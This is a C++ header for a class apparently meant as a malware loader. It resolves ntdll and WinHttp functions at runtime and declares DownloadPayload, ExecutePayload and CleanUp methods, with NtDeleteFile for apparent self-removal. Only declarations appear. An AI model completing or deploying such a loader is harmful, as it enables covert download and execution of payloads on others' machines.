#pragma once
#include <string>
#include "definitions.h"

class Noder {
public:
	Noder();

	~Noder();

private:

	//
	// Imported functions
	//
	f_LdrLoadDll LdrLoadDll;
	f_LdrUnloadDll LdrUnloadDll;
	f_LdrGetProcedureAddressForCaller LdrGetProcedureAddressForCaller; // Unused
	f_RtlInitUnicodeString RtlInitUnicodeString;
	f_RtlInitAnsiString RtlInitAnsiString;
	f_NtDeleteFile NtDeleteFile;
	f_WinHttpOpen WinHttpOpen;
	f_WinHttpConnect WinHttpConnect;
	f_WinHttpOpenRequest WinHttpOpenRequest;
	f_WinHttpSendRequest WinHttpSendRequest;
	f_WinHttpReceiveResponse WinHttpReceiveResponse;
	f_WinHttpQueryDataAvailable WinHttpQueryDataAvailable;
	f_WinHttpReadData WinHttpReadData;
	f_WinHttpCloseHandle WinHttpCloseHandle;

	//
	// Imported dlls
	// 
	HMODULE ntdll;
	HMODULE winhttp;

	//
	// Misc
	//
	std::wstring destination;

	void Init() noexcept;

	bool LoadLibraries() noexcept;

	bool LoadFunctions() noexcept;

	bool DownloadPayload() noexcept;

	void ExecutePayload() noexcept;

	void CleanUp() noexcept;
};